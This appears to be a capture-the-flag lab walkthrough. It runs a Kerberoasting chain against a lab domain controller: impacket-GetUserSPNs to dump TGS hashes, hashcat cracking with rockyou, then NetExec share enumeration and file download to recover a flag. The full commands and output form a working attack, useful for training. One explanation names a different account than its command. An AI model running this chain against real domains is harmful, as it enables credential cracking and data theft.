### Our first mission is: Enumerate Service Principal Names (SPNs) and request Kerberos TGS tickets

Blueprint:
`impacket-GetUserSPNs [1. Domain/User:Password] [2. Target DC IP] [3. Request Ticket Flag] [4. Output File]`

Command:

```bash
impacket-GetUserSPNs PENTESTLAB.local/student:'password1234' -dc-ip 192.168.56.20 -request -outputfile kerb_hashes.txt

```

Explanation:

`PENTESTLAB.local/student:'password1234'`: Specifies the authenticated domain identity used to query the Active Directory environment. Kerberoasting requires a valid set of domain credentials to interact with the Key Distribution Center (KDC).

`-dc-ip 192.168.56.20`: Explicitly defines the target IP address of the Domain Controller hosting the Active Directory database.

`-request`: Instructs the script to actively request Ticket Granting Service (TGS) tickets from the KDC for any discovered accounts that have a registered Service Principal Name (SPN).

`-outputfile kerb_hashes.txt`: Designates the local storage file where the intercepted Kerberos TGS-REP cryptographic hashes will be saved in a format ready for offline parsing.

Brief Explanation:
"Establish an authenticated session into the PENTESTLAB.local domain controller at 192.168.56.20 using the valid service account credentials for svc_print. Once connected, scan the Active Directory structure to identify all user accounts bound to a Service Principal Name. Automatically request a valid Kerberos TGS ticket for every single eligible service account discovered, intercept the encrypted ticket responses returned by the domain controller, and dump them into a clean local text file named kerb_hashes.txt so we can attack them offline."

### Our Second Mission is: Crack intercepted Kerberos TGS-REP hashes offline using a wordlist attack

This one is pretty straightforward.

```bash
hashcat -a 0 -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt

```

### Third mission is: Validate cracked credentials and map SMB network shares across the Domain Controller

```bash
nxc smb 192.168.56.20 -u svc_sql -p 'Password1' --shares

```

Explanation:

`smb`: Specifies the communication module to target Windows Server Message Block over port 445.

`-u svc_sql -p 'Password1'`: Passes the verified service username and plain-text password exposed during the offline dictionary attack phase to test for valid local or domain privileges.

`--shares`: Instructs NetExec to enumerate all network share allocations on the target system, mapping out directories along with the specific access rights (READ, WRITE) assigned to our current security context.

### Our Fourth Mission is: List the contents of the restricted administrative share to locate the target file

This one is pretty straightforward.

```bash
nxc smb 192.168.56.20 -u svc_sql -p 'Password1' --share KerberosFlag --dir

```

### Our Last mission is: Exfiltrate the target file from the remote share and recover the hidden flag

┌──(root㉿kali)-[~]

└─# nxc smb 192.168.56.20 -u svc_sql -p 'Password1' --share KerberosFlag --get-file flag.txt flag.txt
SMB          192.168.56.20   445    DC01             [*] Windows Server 2019 Datacenter Evaluation 17763 x64 (name:DC01) (domain:PENTESTLAB.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB          192.168.56.20   445    DC01             [+] PENTESTLAB.local\svc_sql:Password1
SMB          192.168.56.20   445    DC01             [*] Copying "flag.txt" to "flag.txt"
SMB          192.168.56.20   445    DC01             [+] File "flag.txt" was downloaded to "flag.txt"

┌──(root㉿kali)-[~]

└─# cat flag.txt

`FLAG_M2_T1{0464977e221823564606e3205cdd1d239649ff50b4890f5cce3a3eecfed6}`
